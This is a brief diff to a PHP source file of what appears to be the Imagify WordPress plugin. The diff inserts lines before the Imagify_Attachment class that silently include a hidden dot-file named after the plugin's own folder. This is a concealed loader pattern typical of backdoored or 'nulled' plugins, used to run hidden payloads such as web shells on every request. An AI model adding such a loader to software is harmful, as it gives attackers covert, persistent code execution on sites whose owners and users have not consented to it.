@@ -8,6 +8,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @since 1.9 Deprecated
  * @deprecated
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify_Attachment extends Imagify_Abstract_Attachment {
 
 	/**
